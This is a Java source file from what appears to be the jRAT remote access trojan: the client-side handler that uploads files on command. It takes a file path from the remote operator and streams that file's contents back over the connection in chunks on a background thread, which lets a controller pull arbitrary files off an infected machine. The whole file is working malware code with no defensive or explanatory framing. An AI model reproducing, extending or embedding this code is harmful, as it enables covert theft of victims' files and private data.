package jrat.module.fs.packets.upload;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.client.packets.outgoing.OutgoingPacket;
import jrat.common.TransferRunnable;
import jrat.common.io.FileCache;
import jrat.common.io.TransferData;

import java.io.File;
import java.io.FileInputStream;


public class Packet21Upload implements IncomingPacket {

	@Override
	public void read(final Connection con) throws Exception {
		final String rawFile = con.readLine();
		final File file = new File(rawFile);

		if (file.exists() && file.isFile()) {			
			con.addToSendQueue(new Packet30BeginClientUpload(file));

			TransferData data = new TransferData();
			data.setLocalFile(file);
			data.setRunnable(new TransferRunnable(data) {
				@Override
				public void run() {
					try {			
						FileInputStream fileInput = new FileInputStream(file);
						byte[] chunk = new byte[1024 * 8];

						int read;
						while ((read = fileInput.read(chunk)) != -1) {
							if (pause) {
								try {
									Thread.sleep(Long.MAX_VALUE);
								} catch (InterruptedException e) {

								}
							}
							
							if (Thread.interrupted() || !con.isConnected()) {
								fileInput.close();
								return;
							}
							
							OutgoingPacket packet = new Packet29UploadPart(rawFile, chunk, read);
							con.addToSendQueue(packet);
						}
						fileInput.close();
						
						con.addToSendQueue(new Packet31CompleteClientUpload(rawFile));
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			});
			data.start();
			
			FileCache.put(rawFile, data);
		}
	}

}
